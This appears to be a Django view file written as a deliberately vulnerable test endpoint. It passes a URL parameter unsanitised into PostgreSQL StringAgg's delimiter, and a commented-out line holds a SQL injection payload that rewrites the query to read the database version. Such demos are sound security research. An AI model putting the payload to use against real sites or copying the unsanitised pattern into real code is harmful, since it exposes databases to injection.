from django.shortcuts import render

# Create your views here.
from django.http import HttpResponse

from polls.models import Question
from django.contrib.postgres.aggregates import StringAgg



def index(request, payload):
    # payload = "-"
    # payload = '-\') FROM (SELECT text_1, version() AS text_2 FROM "polls_question") AS polls_question GROUP BY "polls_question"."text_1" -- '
    results = Question.objects.all().values('text_1').annotate(test=StringAgg('text_2', delimiter=payload))
    res = ""
    for e in results:
        res += str(e) + "\n"
    return HttpResponse("Payload is : " + payload + "\nResult is : " + res, content_type="text/plain")